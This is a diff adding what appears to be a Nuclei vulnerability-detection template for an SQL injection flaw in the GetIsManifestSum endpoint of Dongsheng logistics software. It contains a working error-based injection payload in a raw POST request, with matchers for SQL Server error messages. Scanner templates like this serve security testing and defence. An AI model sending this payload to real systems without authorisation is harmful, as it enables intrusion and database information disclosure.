@@ -1,0 +1,30 @@
+id: dongshengsoft-getismanifestsum-sqli
+info:
+  name: 东胜物流软件 GetIsManifestSum SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /MvcShipping/MsOpSeae/GetIsManifestSum HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsno='and+1<@@VERSION--+-
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException:"
+          - ".GetIsManifestSum"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
